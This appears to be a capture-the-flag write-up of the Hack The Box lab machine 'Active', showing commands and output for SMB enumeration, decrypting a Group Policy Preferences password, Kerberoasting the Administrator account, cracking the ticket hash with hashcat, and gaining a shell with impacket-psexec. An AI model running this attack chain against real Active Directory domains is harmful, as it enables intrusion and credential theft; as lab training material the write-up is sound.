---
layout: post
title: "Active"
date: 2021-07-19
categories: [HTB, machine-easy-htb]
tags: [nmap, rustscan, crackmapexec, smbclient, GPP-Group-XML-Leaking-cpassword(MS14-025)(CVE-2014-1812), bloodhound-python, bloodhound, impacket-GetUserSPNs(Kerberoasting), kerberoasting, hashcat, hashcat-13100, impacket-psexec, oscp]
image: /assets/img/HTB/easy/Active/Active.png
---
- Starting by scanning for ports

```
mkdir -p nmaps && rustscan -a $IP --ulimit 5000 -- -vvv -Pn -sC -sV -oN nmaps/nmap_rustscansimple.txt
```
- Output

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-04-24 08:47:19Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack Microsoft Windows RPC
49182/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: -21s
| smb2-time: 
|   date: 2023-04-24T08:48:20
|_  start_date: 2023-04-24T08:42:56
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19805/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 22387/udp): CLEAN (Failed to receive data)
|   Check 4 (port 38631/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

# SMB ENUMERATION
- Let start by know netbios name of this windows and as seen from nmap, it is domain controller

```
 crackmapexec smb $IP
```
- Output

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ crackmapexec smb $IP
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

```
- From above, i know that netbios name is DC and domain is active.htb
- since this is domain, let enumerate domain and if it fail then i will check for CVEs based on this service or other services
- let check for anonymous

```
smbclient -L $IP
```
- Output

```
Password for [WORKGROUP\blackninja]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- As soon i see that anonymous is enable then i will use crackmapexec to see permission

```
crackmapexec smb $IP -u '' -p '' --shares
```
- Output

```
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users 
```
- what does Replication mean in Active directory?=> it mean like backup data for other domain controller in which SYSVOL is backed up about machine and user settings
- Navigate more and read files
- i found some kind of credential

```
┌──(blackninja㉿arena)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ pwd              
/home/blackninja/CTF/HTB/Active/data/smb/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml   
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]

```
- dig more online and found that group policy preferences
- Group Policy Preferences is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems. Preference settings are administrative configuration choices deployed to desktops and servers. Preference settings differ from policy settings because users have a choice to alter the administrative configuration. Policy settings administratively enforce setting, which restricts user choice.
- to decrypt it i need to use gpp-decrypt to decrypt

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
- Output

```
GPPstillStandingStrong2k18
```
- Since i have password `GPPstillStandingStrong2k18` of svc_tgs, i can try to login with smb or winrm
- with smb in crackmapexec, i can all read files and not write in which it mean that i cannot login

```
└─$ crackmapexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ     
```
- i enumerate all files and folder but i got nothing interesting

# KERBEROS ENUMERATION
- let dump data from kerberos
- First i can install neo4j, bloodhound and bloodhound.py

```
sudo apt install neo4j
sudo apt install bloodhound
sudo apt install bloodhound.py
```
- let dump data with bloodhound.py

```
echo -n "10.10.10.100 active.htb" >> /etc/hosts
echo -n "10.10.10.100 DC.active.htb" >> /etc/hosts
bloodhound-python -d active.htb -u svc_tgs -p 'GPPstillStandingStrong2k18' -gc DC.active.htb -c all -ns 10.10.10.100
```
- After that import data to bloodhound and analyze them
- you can start by make svc_tgs as owned
- You can go through bloodhound and i will make it short
- In analysis page, list all kerberoas users , i can see that Administrator is also in there
![](/assets/img/HTB/easy/Active/kerberoast.png)
- let start by doing kerberoas attack

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100  active.htb/svc_tgs:GPPstillStandingStrong2k18         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2023-04-24 11:44:06.824159 
```
- From above, i can tell that there is time in which Administrator did authenticate via active/CIFS 
- now i can request active/CIFS by use that impacket script so as to dump ticket that is associcate with hash of that user  and in this case it is Administrator

```                                                                  
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100  active.htb/svc_tgs:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2023-04-24 11:44:06.824159             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2e7f8792be2f0552dc5570b33333b5ce$f92525306c0ea5f72a8446f2066e64f9149f3fb5ef5f1b145283ff36d8bdcccec58fd192a2fc814f50d95c96711b5896eac4b53e46c38a661d5cd98e801c63e3bda972908f195d73d4410d5950426f3e0dc39cc60cc6cf0f4a8f843c0ccba8f9cc44d4c0cbc706011e9487d548b5f94bd7abe193f58226ff1ba595e9bc81a36912312f0b7dc2fb9f5f1367ef47641cb37aa7fb7e0248214f0b6267a9430762844f0915e5ddccea6bbafce789dd455d924e74b8333c3bfe1c7037be62daaa8355a1fcded5794bb790b387fc5550530d0b55cc72c31e924a5f20fd141d268210b185d8c308f57a98ff3bf505395e56c9f1cdcdf2ac0ea510a8741a8a45a32358b265dd972a17e5faec570df58e90c2d3d42ac6bb129576216902bbdbb9a115181cd37951569f8daa31cf0760ea6a2d6e37eee2a2a89b87dec56d40870c6c094b0ad77f86073c6745c744d025f32df8f3fd970ebadba7c52f0328f671332f4b3417b11713008fc9f213eb9d88302c845a69cec6b8de7c775b9a8b05242de26843599c40439539bdab0b89125a17b1624d50e4dda8c6d719f997eb720b721237ec2f742d79fb84324d0047cc2a709202e7ca6a3d566ba21836b4b6669a9fb0b3dc6f921e9fb8eee471ed416494c3d4927084fdf60e81c5a0d6291b96211e78614a2d4678bd02e4f04277cb7269f1769765198f2e16190ca9dd6683919648dd7a485767c261589486f86b77660b71a719a881bddaf94678db4e09e7b3029d91c7941520beef066199479677b1c62a4b15652bf247980272240d65bd93da59cd4c13900fbee7ea8d4425a19f23e3855ebfef60c1113bbddee492e14d1b974fd0fc66a9ba43e45a81da38d941cfb99ca61d0be72285043fe3daf7d2f64d40a6dc1a71dde275556fbba619d8f2b899df2d7d7f63fbae190f388fc751b4f943f4b0af939cd0745c3540ad03e0c9f5b086b1bb132eefedd4067dca2b5437174c32b9641d7e2bda897391ed48b7eb54070d3c430f581f874a7a2ae9b1c364cc198e0bae398eec0c93d4b90d003f4d5ce6a0c6bb1a196b2cec0967f2885cb58c1b3a9ca5b2a2cf98d0f766cf52bbc1a76593815c0d981e8e58ce479e28d00c356a6f91c741e9799833172a273f4aaa75510ba5fba43bfcfe772c983278d26b6671a5211e71f05d98129eb333ff8cfc9d44404153a7bf39acf5ab90e569ead33d41bd7da99ab016dc216d0b312b3f76020a6b56844c36db93d14dfb1f94bb4329
```
- you can save them as they load

```
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100  active.htb/svc_tgs:GPPstillStandingStrong2k18 -request -outputfile administrator.token
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2023-04-24 11:44:06.824159             
[-] CCache file is not found. Skipping...                                                                      
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ cat administrator.token                                                  
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$64bc86d277ec3d4624f5580a42cf727d$fcacc587ef64a9bc5fbf1b80009e2aece9f7c04ab18ebec3d28ab756b41fc1a40779117695cdcb1482d01b8464cf4bce5285dfe84d0700b30106e7ae24a6622d8098ee92b6cfaf24ae5811ec9bf15d61acd9e6209815be836733d7806760a20c269b2d412a9a2955e147633c5898d5f495c5372cbffb6e8aaa3ba1e6021dd9e7293e72cd542b174c28583a3bf81bda0c752d93a2ee81a9f9c6591774c1a9312e8c0c1a81cc30908aea9810f96fff553d359d45f559e693aafd687bcaa795e1c0f5c5cf47f5c2aef172e3ba53abc88bb54c484492cbde0ea9aef5514fe770777fc9891066b9e568b4bde1453536da418acedd2da581096b9275682e5c894b72ba549ae88599679e57611b67735acf0c0216685b48fd6d3c8d639fdbdcece01275b1d18c9c4b4fb7535a3739e7077c44fa3ac8662cad3c9d88ba71a09eb382ad121e175f82d482a0c8088104ebf0b506bcafffa0329d987a2a2278693d73df21962d3b1c1a0d0ecbf9adf3e64ae72b6246e073d4f3860bfbafe2329dfc9bf98f219024c41860a0266bf2fe23964f05bbb4e8c0162f589a4a2fe98c5dc7e6dcfc9962b16d2a5de49cef2d1cf9cc81d0fcc87c0020242fdc3be996dd4d561654bdeefd9557f51395a3bd21444f7c0a493c17d3a262f052fcb76c9aa30d8acbaa0dfa40432e51ae5f41be455ba14f1dde0beac1bed8855dfc62ec2b82d9b1912dd32394c6108a087a02bcd1b7d359fb802263d479376f02e3cb7c9cfd6965d926594c7f42a1e516b757743b84c5d143b33e574c8971281c9c23810b3c5822a50a037cc6f71a0a5ee5df8b25c6326a57f1a5c36005bfa7978734d53d917bbbf3bd7581e374831e8844fbd20993333e8da837eb4f6cfe8697b2a964e68bae8650fd86383659510e430e9d7cfee19ea4ff395609c07fef544efa5e7a7aa3952f07d650daedd5ee05f1d53e148d8a7d5947754a8722fbdf534622d6f0a53047a4f033e4dc57fe149274b7a95b18e86c61a518b75cccc961e7a7d489b36cf9109ab425a8ff4a7ff153197a342c36be99a085b51f2cc43520eca856d6f6e1b7c499cc285cb9c96cf5a786a7f3c75c2438d23d2bf49c232cbb93fad1b55633495164f499858bc78e041cb6f499cc981b168e411e1dc9cab27073798c9bbf917d55b095f60cb6c6dadc586707a9203485a2a56850b82b3c48e99ca208df93fc32d56613db70cbf10fceec8a2b0a7274c0c56c85b01fddbc37025fb3de35eccd37
```
- use hashcat to crack this ntml v2 hash

```
 hashcat -m 13100 administrator.token /usr/share/wordlists/rockyou.txt
```
- Output

```
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$64bc86d277ec3d4624f5580a42cf727d$fcacc587ef64a9bc5fbf1b80009e2aece9f7c04ab18ebec3d28ab756b41fc1a40779117695cdcb1482d01b8464cf4bce5285dfe84d0700b30106e7ae24a6622d8098ee92b6cfaf24ae5811ec9bf15d61acd9e6209815be836733d7806760a20c269b2d412a9a2955e147633c5898d5f495c5372cbffb6e8aaa3ba1e6021dd9e7293e72cd542b174c28583a3bf81bda0c752d93a2ee81a9f9c6591774c1a9312e8c0c1a81cc30908aea9810f96fff553d359d45f559e693aafd687bcaa795e1c0f5c5cf47f5c2aef172e3ba53abc88bb54c484492cbde0ea9aef5514fe770777fc9891066b9e568b4bde1453536da418acedd2da581096b9275682e5c894b72ba549ae88599679e57611b67735acf0c0216685b48fd6d3c8d639fdbdcece01275b1d18c9c4b4fb7535a3739e7077c44fa3ac8662cad3c9d88ba71a09eb382ad121e175f82d482a0c8088104ebf0b506bcafffa0329d987a2a2278693d73df21962d3b1c1a0d0ecbf9adf3e64ae72b6246e073d4f3860bfbafe2329dfc9bf98f219024c41860a0266bf2fe23964f05bbb4e8c0162f589a4a2fe98c5dc7e6dcfc9962b16d2a5de49cef2d1cf9cc81d0fcc87c0020242fdc3be996dd4d561654bdeefd9557f51395a3bd21444f7c0a493c17d3a262f052fcb76c9aa30d8acbaa0dfa40432e51ae5f41be455ba14f1dde0beac1bed8855dfc62ec2b82d9b1912dd32394c6108a087a02bcd1b7d359fb802263d479376f02e3cb7c9cfd6965d926594c7f42a1e516b757743b84c5d143b33e574c8971281c9c23810b3c5822a50a037cc6f71a0a5ee5df8b25c6326a57f1a5c36005bfa7978734d53d917bbbf3bd7581e374831e8844fbd20993333e8da837eb4f6cfe8697b2a964e68bae8650fd86383659510e430e9d7cfee19ea4ff395609c07fef544efa5e7a7aa3952f07d650daedd5ee05f1d53e148d8a7d5947754a8722fbdf534622d6f0a53047a4f033e4dc57fe149274b7a95b18e86c61a518b75cccc961e7a7d489b36cf9109ab425a8ff4a7ff153197a342c36be99a085b51f2cc43520eca856d6f6e1b7c499cc285cb9c96cf5a786a7f3c75c2438d23d2bf49c232cbb93fad1b55633495164f499858bc78e041cb6f499cc981b168e411e1dc9cab27073798c9bbf917d55b095f60cb6c6dadc586707a9203485a2a56850b82b3c48e99ca208df93fc32d56613db70cbf10fceec8a2b0a7274c0c56c85b01fddbc37025fb3de35eccd37:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...eccd37
Time.Started.....: Mon Apr 24 17:05:58 2023 (4 secs)
Time.Estimated...: Mon Apr 24 17:06:02 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3006.8 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10530816/14344385 (73.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tr1nity -> Teague51
Hardware.Mon.#1..: Temp: 41c Util: 43%

Started: Mon Apr 24 17:05:56 2023
Stopped: Mon Apr 24 17:06:03 2023

```
- let login as Administrator

```
                                                                                                                                                                                                                                   
┌──(blackninja㉿arena)-[~/CTF/HTB/Active]
└─$ impacket-psexec administrator:Ticketmaster1968@10.10.10.100 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file UKFpcmAA.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service EIHw on 10.10.10.100.....
[*] Starting service EIHw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
c55e647a144a8b3277f032b8366ae0da

C:\Windows\system32>  type C:\Users\SVC_TGS\Desktop\user.txt
574b91ba3c944e9243fb7b19b24e6ba7

C:\Windows\system32> 
```
![](/assets/img/HTB/easy/Active/finish.png)
